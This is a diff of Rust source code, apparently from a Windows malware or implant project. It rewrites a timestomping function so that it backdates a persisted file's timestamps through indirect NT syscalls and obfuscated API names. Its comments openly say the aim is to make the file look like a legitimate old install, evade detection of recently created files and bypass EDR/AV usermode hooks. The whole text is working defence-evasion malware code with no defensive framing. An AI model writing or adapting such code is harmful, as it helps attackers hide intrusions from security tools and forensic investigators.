@@ -228,14 +228,11 @@ fn ensure_persistent_location(current_exe: &Path) -> Result<PathBuf, String> {
 
 /// Timestomping: modifica las fechas del archivo para que parezca antiguo
 /// Esto evade detección basada en archivos creados recientemente
+/// Uses indirect syscalls via dinvk to bypass usermode hooks
 #[cfg(target_os = "windows")]
 fn timestomp_file(path: &Path) {
     use std::ffi::OsStr;
     use std::os::windows::ffi::OsStrExt;
-    use winapi::shared::minwindef::FILETIME;
-    use winapi::um::fileapi::{CreateFileW, SetFileTime, OPEN_EXISTING};
-    use winapi::um::handleapi::CloseHandle;
-    use winapi::um::winnt::{FILE_SHARE_READ, FILE_SHARE_WRITE, FILE_WRITE_ATTRIBUTES};
 
     // Fecha objetivo: hace 6-12 meses (varía por máquina)
     // Usamos un timestamp que parece una instalación legítima de Windows
@@ -261,38 +258,133 @@ fn timestomp_file(path: &Path) {
         return;
     }
 
-    let filetime = FILETIME {
-        dwLowDateTime: windows_time as u32,
-        dwHighDateTime: (windows_time >> 32) as u32,
-    };
-
     // Validate path conversion before proceeding
     let path_str = match path.to_str() {
         Some(s) if !s.is_empty() => s,
         _ => return, // Invalid path, skip timestomping
     };
 
-    unsafe {
-        let wide_path: Vec<u16> = OsStr::new(path_str)
-            .encode_wide()
-            .chain(std::iter::once(0))
-            .collect();
+    // Use indirect syscalls for timestomping to bypass EDR hooks
+    timestomp_via_syscall(path_str, windows_time as i64);
+}
 
-        let handle = CreateFileW(
-            wide_path.as_ptr(),
+/// Performs timestomping using indirect syscalls via dinvk
+/// This bypasses usermode API hooks that EDR/AV solutions may have installed
+#[cfg(target_os = "windows")]
+fn timestomp_via_syscall(path_str: &str, windows_time: i64) {
+    use crate::syscalls::dinvk;
+    use std::ffi::OsStr;
+    use std::os::windows::ffi::OsStrExt;
+
+    // FILE_BASIC_INFORMATION structure for NtSetInformationFile
+    #[repr(C)]
+    struct FileBasicInformation {
+        creation_time: i64,
+        last_access_time: i64,
+        last_write_time: i64,
+        change_time: i64,
+        file_attributes: u32,
+    }
+
+    // IO_STATUS_BLOCK structure
+    #[repr(C)]
+    struct IoStatusBlock {
+        status: i32,
+        information: usize,
+    }
+
+    // OBJECT_ATTRIBUTES structure
+    #[repr(C)]
+    struct ObjectAttributes {
+        length: u32,
+        root_directory: *mut std::ffi::c_void,
+        object_name: *mut UnicodeString,
+        attributes: u32,
+        security_descriptor: *mut std::ffi::c_void,
+        security_quality_of_service: *mut std::ffi::c_void,
+    }
+
+    // UNICODE_STRING structure
+    #[repr(C)]
+    struct UnicodeString {
+        length: u16,
+        maximum_length: u16,
+        buffer: *mut u16,
+    }
+
+    // Constants
+    const FILE_WRITE_ATTRIBUTES: u32 = 0x0100;
+    const FILE_SHARE_READ: u32 = 0x00000001;
+    const FILE_SHARE_WRITE: u32 = 0x00000002;
+    const FILE_OPEN: u32 = 0x00000001;
+    const FILE_SYNCHRONOUS_IO_NONALERT: u32 = 0x00000020;
+    const OBJ_CASE_INSENSITIVE: u32 = 0x00000040;
+    const FILE_BASIC_INFORMATION_CLASS: u32 = 4;
+
+    unsafe {
+        // Convert path to NT path format (\??\C:\path\to\file)
+        let nt_path = format!("\\??\\{}", path_str);
+        let mut wide_path: Vec<u16> = OsStr::new(&nt_path).encode_wide().collect();
+
+        let mut unicode_string = UnicodeString {
+            length: (wide_path.len() * 2) as u16,
+            maximum_length: (wide_path.len() * 2) as u16,
+            buffer: wide_path.as_mut_ptr(),
+        };
+
+        let mut object_attrs = ObjectAttributes {
+            length: std::mem::size_of::<ObjectAttributes>() as u32,
+            root_directory: std::ptr::null_mut(),
+            object_name: &mut unicode_string,
+            attributes: OBJ_CASE_INSENSITIVE,
+            security_descriptor: std::ptr::null_mut(),
+            security_quality_of_service: std::ptr::null_mut(),
+        };
+
+        let mut io_status = IoStatusBlock {
+            status: 0,
+            information: 0,
+        };
+
+        let mut handle: *mut std::ffi::c_void = std::ptr::null_mut();
+
+        // Use dinvk syscall macro for NtOpenFile
+        let status: Option<i32> = dinvk::syscall!(
+            obfstr!("NtOpenFile"),
+            &mut handle as *mut *mut std::ffi::c_void,
             FILE_WRITE_ATTRIBUTES,
+            &mut object_attrs as *mut ObjectAttributes,
+            &mut io_status as *mut IoStatusBlock,
             FILE_SHARE_READ | FILE_SHARE_WRITE,
-            std::ptr::null_mut(),
-            OPEN_EXISTING,
-            0,
-            std::ptr::null_mut(),
+            FILE_OPEN | FILE_SYNCHRONOUS_IO_NONALERT
         );
 
-        if handle != winapi::um::handleapi::INVALID_HANDLE_VALUE {
-            // Set creation time, last access time, and last write time
-            SetFileTime(handle, &filetime, &filetime, &filetime);
-            CloseHandle(handle);
+        // Check if NtOpenFile succeeded
+        if status.unwrap_or(-1) < 0 || handle.is_null() {
+            return;
         }
+
+        // Prepare FILE_BASIC_INFORMATION with our target timestamps
+        let mut file_info = FileBasicInformation {
+            creation_time: windows_time,
+            last_access_time: windows_time,
+            last_write_time: windows_time,
+            change_time: windows_time,
+            file_attributes: 0, // 0 means don't change attributes
+        };
+
+        // Use dinvk syscall macro for NtSetInformationFile
+        let _set_status: Option<i32> = dinvk::syscall!(
+            obfstr!("NtSetInformationFile"),
+            handle,
+            &mut io_status as *mut IoStatusBlock,
+            &mut file_info as *mut FileBasicInformation,
+            std::mem::size_of::<FileBasicInformation>() as u32,
+            FILE_BASIC_INFORMATION_CLASS
+        );
+
+        // Close handle using NtClose syscall
+        let _close_status: Option<i32> = dinvk::syscall!(obfstr!("NtClose"), handle);
     }
 }
 
